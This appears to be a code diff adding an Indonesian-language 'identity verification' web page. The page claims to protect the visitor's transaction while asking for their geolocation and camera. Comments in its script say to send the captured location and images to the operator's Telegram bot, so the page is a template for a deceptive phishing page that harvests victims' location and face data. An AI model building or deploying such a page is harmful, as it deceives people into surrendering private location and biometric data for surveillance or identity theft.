@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Verifikasi Identitas</title>
+</head>
+<body>
+    <h1>Verifikasi Identitas</h1>
+    <p>Demi keamanan transaksi Anda, mohon verifikasi lokasi dan wajah Anda.</p>
+    <button id="verifyLocation">Verifikasi Lokasi</button>
+    <button id="verifyCamera">Verifikasi Kamera</button>
+    <script>
+        document.getElementById('verifyLocation').addEventListener('click', function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    alert(`Lokasi Anda: ${latitude}, ${longitude}`);
+                    // Kirim data lokasi ke bot Telegram Anda di sini
+                });
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
+            }
+        });
+
+        document.getElementById('verifyCamera').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // Tampilkan pratinjau video atau ambil foto di sini
+                    alert("Akses kamera diberikan.");
+                    // Kirim data gambar ke bot Telegram Anda di sini
+                })
+                .catch(function(error) {
+                    alert("Akses kamera ditolak.");
+                });
+        });
+    </script>
+</body>
+</html>
